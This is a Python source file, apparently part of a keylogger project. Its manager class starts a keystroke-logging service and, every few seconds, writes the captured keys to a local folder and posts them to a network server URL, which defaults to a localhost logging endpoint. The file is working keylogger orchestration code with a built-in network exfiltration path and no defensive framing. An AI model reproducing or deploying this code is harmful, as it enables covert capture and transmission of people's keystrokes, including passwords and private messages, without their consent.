import time
from keylogger_service import KeyloggerService
from file_writer import FileWriter
from network_writer import NetworkWriter

class KeyloggerManger:
    def __init__(self, interval=5, base_dir="KEYLOGGER_LISTENING", server_url="http://127.0.0.1:8000/log"):
        self.keylogger = KeyloggerService()
        self.writer = FileWriter(base_dir)
        self.network_writer = NetworkWriter(server_url)
        self.interval = interval

    def run(self):
        self.keylogger.start_logging()
        print("🔴 Keylogger started. Press CTRL+C to stop.")

        try:
            while True:
                keys = self.keylogger.get_logged_keys()
                if keys:
                    for encrypted_log in keys:
                        self.writer.write(encrypted_log)
                        self.network_writer.write(encrypted_log)
                    self.keylogger.logged_keys = []
                time.sleep(self.interval)
        except KeyboardInterrupt:
            self.keylogger.stop_logging()
            print("🟢 Keylogger stopped.")
